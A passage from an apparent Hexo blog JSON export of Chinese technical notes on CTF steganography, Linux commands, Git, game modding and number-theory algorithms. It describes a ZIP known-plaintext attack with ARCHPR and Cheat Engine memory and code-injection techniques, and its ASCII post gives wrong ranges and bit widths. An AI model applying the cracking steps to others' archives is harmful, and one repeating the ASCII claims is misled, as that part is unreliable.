解开隐写的方法就是将这些不影响解码结果的位提取出来组成二进制串，然后转换成ASCII字符串。","raw":null,"content":null,"categories":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/categories/ctf/"}],"tags":[{"name":"Base64","slug":"Base64","permalink":"http://yoursite.com/tags/Base64/"},{"name":"隐写","slug":"隐写","permalink":"http://yoursite.com/tags/%E9%9A%90%E5%86%99/"}]},{"title":"爆破压缩包-明文攻击-ARCHPR","slug":"CTF/MISC/爆破压缩包-明文攻击-ARCHPR-xnightmare","date":"2019-12-19T15:50:54.000Z","updated":"2020-02-02T12:14:04.847Z","comments":true,"path":"2019/12/19/CTF/MISC/爆破压缩包-明文攻击-ARCHPR-xnightmare/","link":"","permalink":"http://yoursite.com/2019/12/19/CTF/MISC/%E7%88%86%E7%A0%B4%E5%8E%8B%E7%BC%A9%E5%8C%85-%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB-ARCHPR-xnightmare/","excerpt":"","text":"给出一个加密的压缩包。通过爆破攻击明显是不可行的，复杂度太高。加密的文件内容我们无法查看，但是我们可以看到文件的一些相关信息。发现其中给出的网站源代码文件和之前的一次文件有部分是相同的：这样就可以使用明文攻击，明文攻击是利用已知的压缩包中的部分文件来进行碰撞。具体步骤如下：这里使用工具ARCHPR： 将找到的相同的文件放到一个文件夹中，压缩： 打开ARCHPR，攻击类型和下面都选择明文: 载入需要解密的压缩包和刚刚构造的压缩包： 开始解密，虽然不能够恢复出可打印口令，但是能够得到加密密钥，这样就能够恢复文件了： 加密密钥和口令的关系是：zip默认的加密方式在加密的时候，会用密码生成这三组密钥，然后之后的加密都使用这三组密钥进行，所以它属于密码 -&gt; 三组密钥 -&gt;加密。","raw":null,"content":null,"categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"ZIP","slug":"ZIP","permalink":"http://yoursite.com/tags/ZIP/"},{"name":"ARCHPR","slug":"ARCHPR","permalink":"http://yoursite.com/tags/ARCHPR/"},{"name":"明文攻击","slug":"明文攻击","permalink":"http://yoursite.com/tags/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/"}]},{"title":"Ubuntu安装Web环境","slug":"Linux/Ubuntu安装Web环境","date":"2019-12-14T15:50:54.000Z","updated":"2020-02-02T13:10:54.269Z","comments":true,"path":"2019/12/14/Linux/Ubuntu安装Web环境/","link":"","permalink":"http://yoursite.com/2019/12/14/Linux/Ubuntu%E5%AE%89%E8%A3%85Web%E7%8E%AF%E5%A2%83/","excerpt":"","text":"安装mySQL server 12apt-get install mysql-server# 在安装过程会创建mySQL用户名和密码 安装Apache2 1apt-get install apache2 安装PHP 1apt-get install php 安装ibapache2-mod-php7.0（安装了这个包之后Apache2才能解析PHP） 12apt-get install libapache2-mod-php7.0/etc/init.d/apache2 restart # 重启Apache2使新配置生效 安装php-mysql（安装了这个包之后php才能够连接数据库） 12apt-get install php-mysql/etc/init.d/apache2 restart # 重启Apache2使新配置生效 安装phpMyAdmin（可选） 12apt-get install phpmyadminln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin # 将phpmyadmin的内容软链接到Web目录下，phpMyAdmin实质上就是一个网站，之后可以通过IP/phpmyadmin访问","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"}]},{"title":"Shell 输出/输入重定向","slug":"Linux/Shell-输出-输入重定向","date":"2019-12-10T06:48:38.000Z","updated":"2020-02-02T12:30:45.619Z","comments":true,"path":"2019/12/10/Linux/Shell-输出-输入重定向/","link":"","permalink":"http://yoursite.com/2019/12/10/Linux/Shell-%E8%BE%93%E5%87%BA-%E8%BE%93%E5%85%A5%E9%87%8D%E5%AE%9A%E5%90%91/","excerpt":"","text":"什么是重定向？程序运行时，可以使用Shell执行的特殊标记重定向它的输入和输出。举例来说：将命令输出保存到日志文件中；从文件中读取命令输入；… 输出重定向原理分析我们可以通过strace来监控重定向的系统调用来了解其原理。如果直接执行命令strace ls &gt; /dev/null 2&gt;&amp;1，实际上strace跟踪的是ls命令的系统调用，要实现strace跟踪重定向的系统调用，可以使用两个Shell，称为A和B，在A中执行重定向，B中执行strace命令跟踪A，具体操作如下： 123456# A中echo $$ # $$表示当前Shell的进程ID# 切换到Bstrace -o log -f -p PID # -o：输出文件；-p：跟踪的进程ID；-f：跟踪指定进程通过fork、vfork、clone得到的子进程，因为ls是A的子进程# 再切换回Als &gt; /dev/null 2&gt;&amp;1 输出重定向有3种形式，我们分别查看其系统调用：设文件描述符m、n，文件名filename m&gt;filename（m可以为空，缺省为STDOUT_FILENO） 123# 命令为：ls &gt; /dev/null52758 open(&quot;/dev/null&quot;, O_WRONLY|O_CREAT|O_TRUNC, 0666) = 352758 dup2(3, 1) m&gt;&gt;filename（m可以为空，缺省为STDOUT_FILENO） 123# 命令为：ls &gt;&gt; /dev/null53457 open(&quot;/dev/null&quot;, O_WRONLY|O_CREAT|O_APPEND, 0666) = 353457 dup2(3, 1) m&gt;&amp;n（m可以为空，缺省为STDOUT_FILENO） 12# 命令为：ls &gt;&amp;254234 dup2(2, 1) 我们发现，输出重定向实质上是执行了系统调用dup2，dup2的执行过程是这样的：int dup2(int fd, int fd2); &#x2F;&#x2F; fd2为新的文件描述符的值dup2执行结束后，fd2和fd共享同一个文件表项，内核数据结构如下图所示： 输入重定向的原理和输出重定向大致相同，只是方向相反。 重定向符号的顺序对重定向结果的影响有多个重定向符号时，按照从左到右的顺序执行。一个经典的例子如下： 写法一： 1ls &gt; /dev/null 2&gt;&amp;1 分析：第一步，标准输出指向&#x2F;dev&#x2F;null的文件表项；第二步，标准错误指向标准输出的文件表项，实际上也是指向了&#x2F;dev&#x2F;null的文件表项。结果：将标准输出和标准错误都输出到&#x2F;dev&#x2F;null 写法二 1ls 2&gt;&amp;1 &gt; /dev/null 分析：第一步，标准错误指向标准输出的文件表项；第二步，标准输出指向&#x2F;dev&#x2F;null的文件表项。结果：标准错误指向了标准输出，标准输出指向&#x2F;dev&#x2F;null 参考资料：Bash Reference Manual——3.6 Redirections","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"}],"tags":[{"name":"Linux命令","slug":"Linux命令","permalink":"http://yoursite.com/tags/Linux%E5%91%BD%E4%BB%A4/"}]},{"title":"Linux命令-wc","slug":"Linux/wc命令","date":"2019-12-10T03:31:49.000Z","updated":"2020-02-02T12:30:16.798Z","comments":true,"path":"2019/12/10/Linux/wc命令/","link":"","permalink":"http://yoursite.com/2019/12/10/Linux/wc%E5%91%BD%E4%BB%A4/","excerpt":"","text":"wc（Word Count）命令作用打印文件的行数（行数通过换行符统计）、词数（词指的是空白符分割的长度非零的字符序列）、字节数 控制输入方式： 标准输入，直接输入wc命令。接下来在shell中输入需要统计的文件内容就可以了，按CTRL+D输入EOF结束。 文件输入，在wc filename1 filename2 ... 批量输入。wc --files0-from=F。F是一个文件名（F为-的时候表示标准输入），文件由一系列’\\0’结尾的文件名组成：filename1\\0filename2\\0filename3\\0…，wc会统计filename1，filename2，filename3…的数据。 控制输出内容123456无参数：默认打印打印换行符个数、词数、字节数。-c, --bytes：打印文件中字节的数量-m, --chars：打印字符的数量-l, --lines：打印换行符的数量-w, --words：打印词数-L, --max-line-length：最长行的长度","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"}],"tags":[{"name":"Linux命令","slug":"Linux命令","permalink":"http://yoursite.com/tags/Linux%E5%91%BD%E4%BB%A4/"}]},{"title":"【转载】修改Bash配色","slug":"Linux/【转载】修改Bash配色","date":"2019-12-08T11:42:16.000Z","updated":"2020-02-02T12:25:46.326Z","comments":true,"path":"2019/12/08/Linux/【转载】修改Bash配色/","link":"","permalink":"http://yoursite.com/2019/12/08/Linux/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E4%BF%AE%E6%94%B9Bash%E9%85%8D%E8%89%B2/","excerpt":"","text":"转载自：崇婧的博客-修改Bash的配色 PS1变量简介 PS1是Linux终端用户的一个环境变量，用来说明命令行提示符的设置。 123456789101112\\d ：#代表日期，格式为weekday month date，例如：&quot;Mon Aug 1&quot; \\H ：#完整的主机名称。 \\h ：#仅取主机的第一个名字，如上例，则为fc4，.linux则被省略 \\t ：#显示时间为24小时格式，如：HH：MM：SS \\T ：#显示时间为12小时格式 \\A ：#显示时间为24小时格式：HH：MM \\u ：#当前用户的账号名称 \\v ：#BASH的版本信息 \\w ：#完整的工作目录名称。家目录会以 ~代替 \\W ：#利用basename取得工作目录名称，所以只会列出最后一个目录 \\# ：#下达的第几个命令 \\$ ：#提示字符，如果是root时，提示符为：# ，普通用户则为：$ 颜色设置说明 在PS1中设置字符序列颜色的格式为：[\\e[F;Bm]其中“F”为字体颜色，编号3037；“B”为背景色，编号4047。 颜色表 1234567891011 前景 背景 颜色------------------------ 30 40 黑色 31 41 红色 32 42 绿色 33 43 黄色 34 44 蓝色 35 45 紫红色 36 46 青蓝色 37 47 白色 效果控制代码： 12345678代码 意义 ------------------------- 0 OFF 1 高亮显示 4 underline 5 闪烁 7 反白显示 8 不可见 另外。控制台全局的颜色设置： &#x2F;etc&#x2F;DIR_COLORS 123456# 30=black 31=red 32=green 33=yellow 34=blue 35=magenta 36=cyan 37=white 颜色代码# 40=black 41=red 42=green 43=yellow 44=blue 45=magenta 46=cyan 47=white 背景代码NORMAL 00 # global default, although everything should be something.FILE 00;37 # normal fileDIR 00;33 # directoryLINK 01;36 # symbolic link 如果是ssh登录的可以修改&#x2F;etc&#x2F;DIR_COLORS.xterm","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"}],"tags":[{"name":"Bash","slug":"Bash","permalink":"http://yoursite.com/tags/Bash/"}]},{"title":"source、sh和直接执行——执行Bash Script的三种方式辨析","slug":"Linux/source、sh和直接执行——执行Bash-Script的三种方式辨析","date":"2019-12-08T10:56:21.000Z","updated":"2020-02-02T12:31:01.061Z","comments":true,"path":"2019/12/08/Linux/source、sh和直接执行——执行Bash-Script的三种方式辨析/","link":"","permalink":"http://yoursite.com/2019/12/08/Linux/source%E3%80%81sh%E5%92%8C%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C%E2%80%94%E2%80%94%E6%89%A7%E8%A1%8CBash-Script%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%E8%BE%A8%E6%9E%90/","excerpt":"","text":"&#x2F;&#x2F; 点运算符是source另一种写法，即source test.sh和. test.sh是一个意思 区别一source和sh需要读取权限，而直接执行(.&#x2F;)需要执行权限。 区别二.&#x2F;和sh启动了一个新的Bash，然后在新的Bash中执行命令。source则是在当前Bash中依次执行命令。 实验： 12345#!/bin/shecho &quot;first&quot;sleep 3secho &quot;second&quot; 在运行过程中按Ctrl+C，运行结果如下： 12345678# sh 或 ./first^C# source first^Csecond","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"}],"tags":[{"name":"Linux命令","slug":"Linux命令","permalink":"http://yoursite.com/tags/Linux%E5%91%BD%E4%BB%A4/"}]},{"title":"使用Git进行团队协作和版本管理","slug":"工具/使用Git进行团队协作和版本管理","date":"2019-12-07T15:55:21.000Z","updated":"2020-03-01T15:35:35.019Z","comments":true,"path":"2019/12/07/工具/使用Git进行团队协作和版本管理/","link":"","permalink":"http://yoursite.com/2019/12/07/%E5%B7%A5%E5%85%B7/%E4%BD%BF%E7%94%A8Git%E8%BF%9B%E8%A1%8C%E5%9B%A2%E9%98%9F%E5%8D%8F%E4%BD%9C%E5%92%8C%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86/","excerpt":"","text":"CLion从GitLab拉取项目在CLion中，从GitLab上pull一个项目。 在CentOS中使用命令ssh-keygen -t rsa -C &quot;youremail@example.com&quot;创建公私钥对，默认存储在目录~/.ssh中。 将公钥配置到GitLab上。 打开CLion，在选择项目的界面选择Get From Version Control，选择Git，填入项目的URL，点击clone即可。 对项目进行修改并调试 调试结束之后，将修改commit，然后push到GitLab上 菜单栏中VCS选项卡中包含了Git相关功能，按说明使用即可。 将本地文件夹上传到远程代码仓库01 准备好本地Git仓库 初始化空Git仓库 1git init 将修改添加到暂存区 1git add . 提交修改 1git commit -m &quot;comments&quot; 02 在远程代码仓库添加公钥以允许上传 生成ssh密钥对 12cd ~/.sshssh-keygen -t rsa -C &quot;example@example.com&quot; 将公钥复制到远程代码仓库 03 本地配置远程代码仓库信息并上传 设置远程仓库URL 12cd 本地仓库/git remote add origin xxxx ​ 如果需要修改远程仓库URL，可以使用下面的命令： 123456# 参考：https://help.github.com/cn/github/using-git/changing-a-remotes-urlgit remote -v # 查看现在的远程仓库URLgit remote set-url origin ssh://domain:port/username/project.git# 或者git remote remove origingit remote add origin &lt;url&gt; 上传代码 1git push -u origin master","raw":null,"content":null,"categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Git","slug":"Git","permalink":"http://yoursite.com/tags/Git/"},{"name":"CLion","slug":"CLion","permalink":"http://yoursite.com/tags/CLion/"}]},{"title":"命令firewall-cmd的使用","slug":"Linux/命令firewall-cmd的使用","date":"2019-11-09T16:11:38.000Z","updated":"2020-02-02T12:28:47.641Z","comments":true,"path":"2019/11/10/Linux/命令firewall-cmd的使用/","link":"","permalink":"http://yoursite.com/2019/11/10/Linux/%E5%91%BD%E4%BB%A4firewall-cmd%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"firewalld简介firewall-cmd是firewalld的命令行管理工具。firewalld是Linux上新用的防火墙软件，和iptables用途差不多。firewalld自身并不具备防火墙的功能，而是和iptables一样需要通过内核的netfilter来实现。 firewalld的优点 支持动态更新，更改配置后不需要重启服务。 加入了防火墙的“zone”的概念 常用命令安装firewalldubuntu 16.04中并没有预装firewalld，使用命令apt-get install firewalld安装 列出域中所有添加或启用的内容1firewall-cmd --list-all 向域中添加某个TCP端口1firewall-cmd --add-port=xxxx/tcp 从域中删除某个开放的TCP端口1firewall-cmd --remove-port=xxxx/tcp","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"}],"tags":[{"name":"防火墙","slug":"防火墙","permalink":"http://yoursite.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"}]},{"title":"红色警戒——修改空降兵为核电站+空降数量800","slug":"游戏修改/红色警戒——修改空降兵为核电站-空降数量800","date":"2019-10-30T12:48:47.000Z","updated":"2020-02-02T12:04:01.718Z","comments":true,"path":"2019/10/30/游戏修改/红色警戒——修改空降兵为核电站-空降数量800/","link":"","permalink":"http://yoursite.com/2019/10/30/%E6%B8%B8%E6%88%8F%E4%BF%AE%E6%94%B9/%E7%BA%A2%E8%89%B2%E8%AD%A6%E6%88%92%E2%80%94%E2%80%94%E4%BF%AE%E6%94%B9%E7%A9%BA%E9%99%8D%E5%85%B5%E4%B8%BA%E6%A0%B8%E7%94%B5%E7%AB%99-%E7%A9%BA%E9%99%8D%E6%95%B0%E9%87%8F800/","excerpt":"","text":"相关游戏：红色警戒2尤里的复仇 视频简介：修改配置文件rulesmd.ini &#x2F;&#x2F; 修改美国空降兵类型为NANRCT（核电站） AmerParaDropInf&#x3D;NANRCT ;Types of infantry for the planes to drop &#x2F;&#x2F; 修改空降兵数量为800 AmerParaDropNum&#x3D;800 ;How many of each of those infantry 修改后的效果是虽然空降单位不可见，但是可以选中，并且能够进行超时空移动，被打爆会产生和核电站爆炸一样的效果。 B站视频地址：https://www.bilibili.com/video/av73957748","raw":null,"content":null,"categories":[{"name":"游戏修改","slug":"游戏修改","permalink":"http://yoursite.com/categories/%E6%B8%B8%E6%88%8F%E4%BF%AE%E6%94%B9/"}],"tags":[{"name":"红色警戒","slug":"红色警戒","permalink":"http://yoursite.com/tags/%E7%BA%A2%E8%89%B2%E8%AD%A6%E6%88%92/"}]},{"title":"红色警戒——修改rules.ini教程","slug":"游戏修改/红色警戒——修改rules-ini教程","date":"2019-10-30T11:45:16.000Z","updated":"2020-02-02T12:04:22.374Z","comments":true,"path":"2019/10/30/游戏修改/红色警戒——修改rules-ini教程/","link":"","permalink":"http://yoursite.com/2019/10/30/%E6%B8%B8%E6%88%8F%E4%BF%AE%E6%94%B9/%E7%BA%A2%E8%89%B2%E8%AD%A6%E6%88%92%E2%80%94%E2%80%94%E4%BF%AE%E6%94%B9rules-ini%E6%95%99%E7%A8%8B/","excerpt":"","text":"下载XCC Mixer工具，打开文件 -&gt; 红警安装目录 -&gt; ra2.mix -&gt; local.mix -&gt; rules.ini -&gt; 右键释放到红警安装目录，然后更改rules.ini文件中相应的属性值就可以了。 上面的目录是原版红警的路径，某些修改版本的红警该路径下虽然也存在rules.ini文件，但这并不是真正使用的规则配置文件，真正配置文件的路径是 红警安装目录&#x2F;expandmd01.mix&#x2F;rulesmd.ini","raw":null,"content":null,"categories":[{"name":"游戏修改","slug":"游戏修改","permalink":"http://yoursite.com/categories/%E6%B8%B8%E6%88%8F%E4%BF%AE%E6%94%B9/"}],"tags":[{"name":"红色警戒","slug":"红色警戒","permalink":"http://yoursite.com/tags/%E7%BA%A2%E8%89%B2%E8%AD%A6%E6%88%92/"}]},{"title":"ASCII编码","slug":"计算机组成原理及体系结构/ASCII编码","date":"2019-10-16T11:44:19.000Z","updated":"2020-02-02T12:19:34.319Z","comments":true,"path":"2019/10/16/计算机组成原理及体系结构/ASCII编码/","link":"","permalink":"http://yoursite.com/2019/10/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/ASCII%E7%BC%96%E7%A0%81/","excerpt":"","text":"ASCII(American Standard Code for Information Interchange) 美国信息交换标准代码标准ASCII码也叫基础ASCII码，使用7位二进制数（剩下的一位二进制为0）来表示所有的大写和小写字母，数字0-9，标点符号。 可见字符和不可见字符的范围 范围 是否可见 0-31、107 不可见 32-106 可见 常见字符的ASCII值： 符号 ASCII值 空字符 0 退格符 \\b 8 制表符 \\t 9 换行符 \\n 10 回车符 \\r 13 空格 32 0 48 A 65 a 97 扩展ASCII是由IBM制定的，并不是标准的ASCII字符，范围是80H-FFH，用于表示框线、音标和其他欧洲非英语系的字母。 扩展： ASCII只有8位，只能表示256种字符，人们又指定了Unicode。Unicode（Universal Code），又称万国码、统一码是计算机领域的一项业界标准，对世界上大部分的文字系统进行了整理和编码，使计算机可以用更简单的方式呈现和处理字符。Unicode至今仍在不断修订，每个新版本都会加入更多的新字符。 一个字符的Unicode编码是确定的，但是由于不同系统平台的设计不同，以及处于节省空间的目的，Unicode的实现方式有所不同，因此Unicode的实现方式被称为 Unicode转换格式（Unicode Transformation Format，简称为UTF）。","raw":null,"content":null,"categories":[{"name":"计算机组成原理与体系结构","slug":"计算机组成原理与体系结构","permalink":"http://yoursite.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"编码","slug":"编码","permalink":"http://yoursite.com/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"B站CE教学实例应用-由浅入深学习游戏修改-个人学习笔记","slug":"游戏修改/B站CE教学实例应用-由浅入深学习游戏修改-个人学习笔记","date":"2019-10-09T14:05:27.000Z","updated":"2020-02-02T12:04:50.027Z","comments":true,"path":"2019/10/09/游戏修改/B站CE教学实例应用-由浅入深学习游戏修改-个人学习笔记/","link":"","permalink":"http://yoursite.com/2019/10/09/%E6%B8%B8%E6%88%8F%E4%BF%AE%E6%94%B9/B%E7%AB%99CE%E6%95%99%E5%AD%A6%E5%AE%9E%E4%BE%8B%E5%BA%94%E7%94%A8-%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%AD%A6%E4%B9%A0%E6%B8%B8%E6%88%8F%E4%BF%AE%E6%94%B9-%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"课程的地址是https://www.bilibili.com/video/av19083605/?p=3 总结一下每种技术的应用场景 第一课——精确地址的搜索数值具体值可知，通过操纵数据具体值的变化不断缩小搜索范围，直到锁定唯一值。 第二课——模糊数值的搜索数值具体值不可知（比如游戏中一个进度条可能并不会显示具体的百分比，只能大概估计），通过数据的大致变化不断缩小搜索范围，直到锁定唯一值。 第三课——指针与多级指针以游戏植物大战僵尸为例，我们的目标是修改阳光值。 通过精确地址的搜索，我们可以获得阳光变量的地址。但是，如果我们重新进入关卡，原来的地址就失效了，需要重新寻找阳光变量的地址。 这是为什么呢？ 在程序中，阳光变量地址 &#x3D; 阳光指针地址（通过“Find out what writes to this address”功能找到） + 偏移，其中偏移是固定的，而阳光指针地址则保存在基址中。由于动态加载（或者其他我不知道的原因），阳光指针地址是会动态变化的，从而导致计算得到的阳光变量地址也会动态变化。 可以想到，如果能够记录下基址，不就可以解决这个问题了吗？ 可以利用精确地址搜索的思想来找到基址。 记录了基址，就能够一劳永逸地修改阳光了吗？很遗憾，还是不行。 因为在程序中，可能存在多级： 12345基址指针n-1 = 基址n + 偏移n......阳光指针地址 = 基址1 + 偏移1阳光变量地址 = 阳光指针 + 偏移 基址同样可能动态变化，只有找到一个不会动态变化的基址，才能彻底解决问题。程序中恰好有这样一种地址——模块地址（模块地址从0x00400000开始）。（可以通过“Find out what accesses this address”功能找到上一个基址指针，直到基址为模块地址为止） 第四课——汇编与代码注入 修改汇编代码 申请一块内存，写入自己的汇编代码 第五课——共用代码段的处理 敌我共用。找到区分敌我的数据结构，注入代码进行判断。 加减共用。注入代码判断数值的正负。 第六课——特征代码的应用我们要修改的程序段的地址会动态变化，但是附近可能存在具有唯一性的机器码，可以用这个机器码作为特征代码，然后定位到需要修改的程序段。 第七课——人造指针的方法使用场景： 指针级数特别多 采用普通的方法不能找到基址 方法一：在固定的地址造指针（地址必须可以访问）在模块内存中选取一段空闲内存，存储需要修改的值的地址优先选可读可写，如果没有可读可写，也可以用可读，fullaccess(addr, len) 方法二：在申请的地址造指针 &#x2F;&#x2F; 全局变量 registersymbol(point)","raw":null,"content":null,"categories":[{"name":"游戏修改","slug":"游戏修改","permalink":"http://yoursite.com/categories/%E6%B8%B8%E6%88%8F%E4%BF%AE%E6%94%B9/"}],"tags":[{"name":"CE","slug":"CE","permalink":"http://yoursite.com/tags/CE/"}]},{"title":"模逆元-费马小定理","slug":"算法/模逆元-费马小定理","date":"2019-10-01T09:01:28.000Z","updated":"2020-02-02T12:20:25.844Z","comments":true,"path":"2019/10/01/算法/模逆元-费马小定理/","link":"","permalink":"http://yoursite.com/2019/10/01/%E7%AE%97%E6%B3%95/%E6%A8%A1%E9%80%86%E5%85%83-%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86/","excerpt":"","text":"欧拉定理： 如果gcd(a, n)&#x3D;1，则a^(φ(n))&#x3D;1(mod n) 费马小定理是欧拉定理的特殊情况： 费马小定理： 若p为质数，且gcd(a,p)&#x3D;1，则a^(p-1)&#x3D;1(mod p) 即a^-1(mod p) &#x3D; a^(p-2)","raw":null,"content":null,"categories":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"1^k+2^k+...+n^k的一种求法","slug":"算法/1-k-2-k-n-k的一种求法","date":"2019-09-21T00:38:08.000Z","updated":"2020-02-02T12:24:43.773Z","comments":true,"path":"2019/09/21/算法/1-k-2-k-n-k的一种求法/","link":"","permalink":"http://yoursite.com/2019/09/21/%E7%AE%97%E6%B3%95/1-k-2-k-n-k%E7%9A%84%E4%B8%80%E7%A7%8D%E6%B1%82%E6%B3%95/","excerpt":"","text":"当k&#x3D;1时，推导过程如下图： 使用和上图相似的推导过程，依次可以计算得到，k&#x3D;2,3,4时的公式。 更进一步，不加证明的给出一个通用的公式： 代码实现：&#x2F;&#x2F; 这种算法 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;int pow(int n, int k)&#123; int res = 1; int multi = n; while(k)&#123; if(k % 2 == 1)&#123; res *= multi; &#125; multi = multi * multi; k /= 2; &#125; return res;&#125;int kn(int n, int k)&#123; if(k == 1) return n * (n + 1) / 2; int res = pow(n+1, k+1); res -= 1 + n; int multi = (k + 1) * k / 2; for(int i=2; i&lt;k+1; i++)&#123; res -= multi * kn(n, k-i+1); multi = multi * (k - i + 1) / (i + 1); &#125; return res / (k + 1);&#125;int main()&#123; int n, k; while(scanf(&quot;%d %d&quot;, &amp;n, &amp;k) != EOF)&#123; printf(&quot;%d\\n&quot;, kn(n, k)); &#125; return 0;&#125;","raw":null,"content":null,"categories":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"模逆元-扩展欧几里得算法","slug":"算法/模逆元-扩展欧几里得算法","date":"2019-09-20T13:47:09.000Z","updated":"2020-02-02T12:20:43.664Z","comments":true,"path":"2019/09/20/算法/模逆元-扩展欧几里得算法/","link":"","permalink":"http://yoursite.com/2019/09/20/%E7%AE%97%E6%B3%95/%E6%A8%A1%E9%80%86%E5%85%83-%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/","excerpt":"","text":"什么是模逆元？一整数a对同余n之模逆元是指，满足以下条件的整数b： ab &#x3D; 1 (mod n) a对同余n的模逆元存在的充分必要条件是a和n互素。 为什么要求逆元？将分数求模转换为乘法求模。 计算方法——扩展欧几里得算法推导 C++实现123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;void extgcd(int a, int b, int *res)&#123; // 扩展欧几里得算法的实现部分，a、b为输入的两个互素的整数，函数执行结束之后，res[0]、res[1]保存的分别是s&lt;sub&gt;n&lt;/sub&gt;和t&lt;sub&gt;n&lt;/sub&gt;的值 if(a &lt; b)&#123; int tmp = b; b = a; a = tmp; &#125; int fir[2]; // fir[0]、fir[1]保存的分别是s&lt;sub&gt;n-2&lt;/sub&gt;和t&lt;sub&gt;n-2&lt;/sub&gt;的值 int sec[2]; // sec[0]、sec[1]保存的分别是s&lt;sub&gt;n-1&lt;/sub&gt;和t&lt;sub&gt;n-1&lt;/sub&gt;的值 fir[0] = sec[1] = 1; fir[1] = sec[0] = 0; while(a%b)&#123; res[0] = fir[0] - a/b*sec[0]; res[1] = fir[1] - a/b*sec[1]; fir[0] = sec[0]; fir[1] = sec[1]; sec[0] = res[0]; sec[1] = res[1]; int tmp = b; b = a % b; a = tmp; &#125;&#125;int main()&#123; int res[2]; int a, b; scanf(&quot;%d %d&quot;, &amp;a, &amp;b); extgcd(a, b, res); printf(&quot;%d %d&quot;, res[0], res[1]); return 0;&#125;","raw":null,"content":null,"categories":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"gcd——欧几里得算法","slug":"算法/gcd——欧几里得算法","date":"2019-09-19T03:44:09.000Z","updated":"2020-02-02T12:24:15.139Z","comments":true,"path":"2019/09/19/算法/gcd——欧几里得算法/","link":"","permalink":"http://yoursite.com/2019/09/19/%E7%AE%97%E6%B3%95/gcd%E2%80%94%E2%80%94%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/","excerpt":"","text":"问题： a, b是正整数，求a, b的最大公约数（greatest common divisor）。 证明： 首先计算得到序列：a, b, a%b, b%(a%b), …, 0 （用前一个元素模后一个元素，直到0为止）。 因为这个序列是递减的，且递减值为整数，所以经过有限次计算一定能够得到0，该序列一定存在。 设g为a, b的gcd，由a&#x3D;gl, b&#x3D;gm, a&#x3D;kb+r可以推出，g(l-km)&#x3D;r，即g也是b和a%b的公约数，那么g是否为b和a%b的gcd呢？设g’为b和a%b的最大公约数，即g’&gt;&#x3D;g，由b&#x3D;g’l’, a%b&#x3D;g’m’, a&#x3D;kb+a%b可以得到a&#x3D;g’(kl’+m’)，说明g’也是a和b的gcd，即有g’&lt;&#x3D;g，进而推出g’&#x3D;&#x3D;g。因此，我们可以得到结论a, b和b, a%b的gcd是相同的。 根据2中的结论，gcd(a, b) &#x3D; gcd(b, a%b) &#x3D; … &#x3D; gcd(x, 0) &#x3D; x (x为最后一个非零数)。 用途： 求两个数的gcd 判断两个数是否互素","raw":null,"content":null,"categories":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"hash类问题","slug":"算法/hash类问题","date":"2019-08-18T16:00:00.000Z","updated":"2020-02-02T12:24:31.515Z","comments":true,"path":"2019/08/19/算法/hash类问题/","link":"","permalink":"http://yoursite.com/2019/08/19/%E7%AE%97%E6%B3%95/hash%E7%B1%BB%E9%97%AE%E9%A2%98/","excerpt":"","text":"hash类问题九度OJ-谁是你的潜在朋友题目描述： “臭味相投”——这是我们描述朋友时喜欢用的词汇。两个人是朋友通常意味着他们存在着许多共同的兴趣。然而作为一个宅男，你发现自己与他人相互了解的机会并不太多。幸运的是，你意外得到了一份北大图书馆的图书借阅记录，于是你挑灯熬夜地编程，想从中发现潜在的朋友。 